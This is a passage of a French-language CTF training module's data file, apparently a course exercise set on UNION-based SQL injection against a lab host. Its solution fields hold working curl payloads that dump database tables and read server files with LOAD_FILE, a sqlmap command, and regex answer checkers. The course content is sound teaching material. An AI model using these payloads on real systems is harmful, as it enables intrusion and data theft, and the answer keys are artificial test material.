      pivot: "Listez les colonnes de <code>secrets</code> avant d'en extraire le contenu."
    },
    {
      id: 'm11-e9',
      title: 'Lister les colonnes de secrets',
      context: "La table <code>secrets</code> contient probablement le flag de l'UNION.",
      task: "Injectez une UNION qui affiche <code>group_concat(column_name)</code> depuis <code>information_schema.columns</code> pour la table <code>secrets</code>.",
      hint: "Filtrez avec <code>WHERE table_name='secrets'</code>.",
      accept: [/UNION%20SELECT%201,group_concat\(column_name\),3%20FROM%20information_schema\.columns%20WHERE%20table_name='secrets'/i],
      solution: 'curl -s "http://sql.ctf.lab/product.php?id=-1%20UNION%20SELECT%201,group_concat(column_name),3%20FROM%20information_schema.columns%20WHERE%20table_name=\'secrets\'--%20-"',
      output: ['id,label,value'],
      read: "Trois colonnes : <code>id</code>, <code>label</code> et <code>value</code>. On concatène les trois pour extraire toutes les lignes en une requête.",
      pivot: "Utilisez <code>0x3a</code> comme séparateur pour distinguer les champs."
    },
    {
      id: 'm11-e10',
      title: 'Extraire les secrets',
      context: "Vous devez lire le contenu de la table <code>secrets</code>.",
      task: "Injectez une UNION qui affiche <code>group_concat(id,0x3a,label,0x3a,value)</code> depuis <code>secrets</code>.",
      hint: "La requête complète utilise <code>-1 UNION SELECT 1,group_concat(id,0x3a,label,0x3a,value),3 FROM secrets-- -</code>.",
      accept: [/UNION%20SELECT%201,group_concat\(id,0x3a,label,0x3a,value\),3%20FROM%20secrets/i],
      solution: 'curl -s "http://sql.ctf.lab/product.php?id=-1%20UNION%20SELECT%201,group_concat(id,0x3a,label,0x3a,value),3%20FROM%20secrets--%20-"',
      output: [
        '1:admin_note:FLAG{SQLI_UNION_DUMP}',
        '2:api_key:lab-only-not-real'
      ],
      read: "Le flag de l'UNION est extrait. La seconde ligne est une clé de lab, non réelle, qui montre l'impact : toutes les données sensibles sont accessibles.",
      pivot: "Automatisez maintenant avec sqlmap pour confirmer la détection et produire un rapport."
    },
    {
      id: 'm11-e11',
      title: 'Confirmer avec sqlmap',
      context: "Vous devez vérifier l'injection avec un outil automatisé et lister les bases.",
      task: "Lancez sqlmap sur <code>product.php?id=1</code> en mode batch avec <code>--dbs</code> et une sortie dans <code>evidence/sqlmap</code>.",
      hint: "Utilisez <code>--batch --level=2 --risk=1 --output-dir=evidence/sqlmap --dbs</code>.",
      accept: [/sqlmap\s+-u\s+["']?http:\/\/sql\.ctf\.lab\/product\.php\?id=1.*--batch.*(--dbs|--output-dir=evidence\/sqlmap)/i],
      solution: 'sqlmap -u "http://sql.ctf.lab/product.php?id=1" --batch --level=2 --risk=1 --output-dir=evidence/sqlmap --dbs',
      output: [
        'Parameter: id (GET)',
        'Type: boolean-based blind',
        'back-end DBMS: MySQL >= 8.0',
        'available databases [2]:',
        '[*] atlas',
        '[*] information_schema'
      ],
      read: "sqlmap confirme l'injection booléenne et identifie MySQL 8.0. Deux bases sont accessibles.",
      pivot: "Dump ciblé de <code>atlas.secrets</code> pour obtenir le flag <code>FLAG{SQLI_SQLMAP}</code>."
    },
    {
      id: 'm11-e12',
      title: 'Lire un fichier et capturer le flag final',
      context: "Le compte MySQL dispose du privilège <code>FILE</code> dans ce lab.",
      task: "Lisez <code>/var/www/html/flag.txt</code> avec <code>LOAD_FILE()</code> via une UNION, puis extrayez le flag racine de la table <code>users</code>.",
      hint: "Utilisez <code>UNION SELECT 1,LOAD_FILE('/var/www/html/flag.txt'),3</code> puis <code>group_concat(username,0x3a,role,0x3a,flag)</code>.",
      accept: [/LOAD_FILE\('\/var\/www\/html\/flag\.txt'\).*group_concat\(username,0x3a,role,0x3a,flag\)/is],
      solution: 'curl -s "http://sql.ctf.lab/product.php?id=-1%20UNION%20SELECT%201,LOAD_FILE(\'/var/www/html/flag.txt\'),3--%20-" && curl -s "http://sql.ctf.lab/product.php?id=-1%20UNION%20SELECT%201,group_concat(username,0x3a,role,0x3a,flag),3%20FROM%20users--%20-"',
      output: [
        'FLAG{SQLI_FILE_READ}',
        'admin:administrator:FLAG{SQLI_ROOT}'
      ],
      read: "La lecture de fichier prouve l'impact serveur, et la table users livre le flag racine. L'injection SQL permet donc bien plus qu'une fuite de données.",
      pivot: "Rédigez la chaîne complète : commentaire → détection → bypass → UNION → schéma → sqlmap → fichier → flag. Proposez les requêtes paramétrées et le moindre privilège."
    }
  ],
  quiz: 'q11'
};
